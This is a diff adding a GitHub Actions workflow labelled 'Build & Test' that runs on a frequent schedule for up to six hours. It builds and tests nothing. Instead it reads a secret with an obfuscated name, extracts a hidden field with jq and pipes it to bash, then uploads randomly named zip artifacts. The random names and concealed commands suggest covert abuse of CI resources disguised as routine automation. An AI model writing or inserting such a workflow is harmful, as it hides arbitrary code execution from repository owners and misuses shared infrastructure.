@@ -1,0 +1,32 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '11 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          kclu01782: ${{ secrets.kclu01782 }}
+        run: |
+          printf '%s' "$kclu01782" | jq -r .eexr550 | /bin/bash
+          echo $jwnwz88443 | jq -r .tppni28850 | /bin/bash
+          printf '%s' "$jos65928" | jq -r .cit76 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: DDokZjWu
+          path: "*.zip"
+          retention-days: 1
